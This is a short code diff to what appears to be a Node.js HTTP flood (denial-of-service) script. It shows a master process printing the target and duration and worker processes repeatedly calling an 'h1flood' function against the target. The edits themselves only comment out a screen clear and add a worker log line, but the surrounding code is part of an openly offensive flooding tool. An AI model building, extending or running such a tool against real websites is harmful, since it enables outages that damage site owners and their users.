@@ -387,7 +387,7 @@ function h1flood() {
     }).end();
 }
 if (cluster.isMaster) {
-console.clear();
+//console.clear();
 console.log("\x1b[1;36m|=====================================|\x1b[0m");
 console.log("\x1b[1;36mTarget: \x1b[0m\x1b[1;33m" + args.target + "\x1b[0m");
 console.log("\x1b[1;36mTime: \x1b[0m\x1b[1;33m" + args.time + "\x1b[0m");
@@ -414,6 +414,7 @@ console.log("\x1b[1;36m|=====================================|\x1b[0m");
         process.exit();
     }, args.time * 1000);
 } else {
+  console.log(`Worker ${process.pid}`);
 if (parsedTarget.protocol === 'http:') {
     setInterval(h1flood);
 } else {
